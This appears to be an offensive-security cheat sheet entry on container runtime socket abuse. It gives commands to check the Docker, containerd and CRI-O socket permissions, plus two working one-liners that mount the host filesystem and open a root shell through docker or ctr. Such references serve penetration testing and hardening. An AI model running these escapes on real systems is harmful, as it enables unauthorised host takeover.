---
technique: Container Runtime Socket Abuse
category: privilege-escalation
targets: Docker, containerd, CRI-O
protocols: UNIX Socket
remote_capable: false
tags: containers privilege-escalation docker containerd socket
---

# Container Runtime Socket Abuse

Runtime socket abuse uses access to Docker, containerd, or CRI-O sockets to create privileged containers or inspect host workloads.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Socket access | Current user or container must read and write to the runtime socket |
| Runtime client | Docker, ctr, crictl, or compatible client must be available |
| Image availability | A usable image must exist or be pullable |

## Linux

### Docker socket

#sh #docker #socket

Check Docker socket permissions.

```sh title:"Check Docker socket permissions"
ls -la /var/run/docker.sock
```
<!-- cheat -->

### containerd socket

#sh #containerd #socket

Check containerd socket permissions.

```sh title:"Check containerd socket permissions"
ls -la /run/containerd/containerd.sock
```
<!-- cheat -->

### CRI-O socket

#sh #crio #socket

Check CRI-O socket permissions.

```sh title:"Check CRI-O socket permissions"
ls -la /var/run/crio/crio.sock
```
<!-- cheat -->

### Docker socket host mount

#sh #docker #socket

Use Docker socket access to mount the host filesystem.

```sh title:"Mount host through Docker socket"
docker run --rm -it -v /:/host "$image_name" chroot /host /bin/sh
```
<!-- cheat
var image_name
-->

### containerd host mount

#sh #containerd #socket

Use containerd access to run a container with the host filesystem mounted.

```sh title:"Mount host through containerd"
ctr run --mount type=bind,src=/,dst=/host,options=rbind:rw -t "$image_name" "$container_name" /bin/sh
```
<!-- cheat
var image_name
var container_name
-->
